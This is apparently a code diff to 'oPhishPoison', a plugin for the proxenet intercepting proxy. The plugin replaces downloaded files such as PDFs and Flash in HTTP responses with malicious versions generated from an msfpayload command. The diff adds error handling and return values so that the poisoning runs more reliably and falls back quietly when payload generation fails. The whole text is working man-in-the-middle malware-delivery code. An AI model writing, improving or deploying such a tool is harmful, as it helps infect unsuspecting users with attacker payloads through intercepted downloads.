@@ -17,6 +17,7 @@ __PLUGIN__ = "oPhishPoison"
 __AUTHOR__ = "@_hugsy_"
 
 
+import os, subprocess
 from pimp import HTTPResponse, HTTPBadResponseException
 
 
@@ -60,10 +61,14 @@ def replace_with_malicious(http, ctype):
     elif ctype == "pdf":            cmd += "--pdf"
     elif ctype == "swf":            cmd += "--flash"
 
-    f = open(path_to_msfpayload, "rb")
-    p = subprocess.Popen(cmd.split(" "), stdin=f)
-    res = p.communicate()[0]
-    f.close()
+    try:
+        f = open(path_to_msfpayload, "rb")
+        p = subprocess.Popen(cmd.split(" "), stdin=f)
+        res = p.communicate()[0]
+        f.close()
+    except Exception as e:
+        print("Payload generation failed: %s" % e)
+        return False
 
     #2.
     with open(res, "rb") as f:
@@ -72,7 +77,7 @@ def replace_with_malicious(http, ctype):
     os.unlink(res)
 
     # 3.
-    return
+    return True
 
 
 def proxenet_request_hook(rid, request, uri):
@@ -99,7 +104,9 @@ def proxenet_response_hook(rid, response, uri):
             del(http)
             return response
 
-        replace_with_malicious(http, detected_type)
+        if replace_with_malicious(http, detected_type) == False:
+            del(http)
+            return response
 
         print("Poisoining {} file in response {}: {}".format(detected_type, rid, http.headers))
         return http.render()
